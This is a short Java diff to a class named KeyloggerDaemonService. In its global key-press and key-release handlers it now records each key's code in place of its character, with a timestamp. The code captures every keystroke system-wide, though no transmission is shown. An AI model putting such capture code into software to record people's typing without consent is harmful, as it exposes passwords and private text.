@@ -99,7 +99,7 @@ public class KeyloggerDaemonService implements ClientStateModel.IClientStatusLis
      */
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        controller.enqueueKeyStroke(new KeyStrokePojo(nativeKeyEvent.getKeyChar(),true, System.currentTimeMillis()));
+        controller.enqueueKeyStroke(new KeyStrokePojo(nativeKeyEvent.getKeyCode(),true, System.currentTimeMillis()));
     }
 
     /**
@@ -109,6 +109,6 @@ public class KeyloggerDaemonService implements ClientStateModel.IClientStatusLis
      */
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
-        controller.enqueueKeyStroke(new KeyStrokePojo(nativeKeyEvent.getKeyChar(),false, System.currentTimeMillis()));
+        controller.enqueueKeyStroke(new KeyStrokePojo(nativeKeyEvent.getKeyCode(),false, System.currentTimeMillis()));
     }
 }
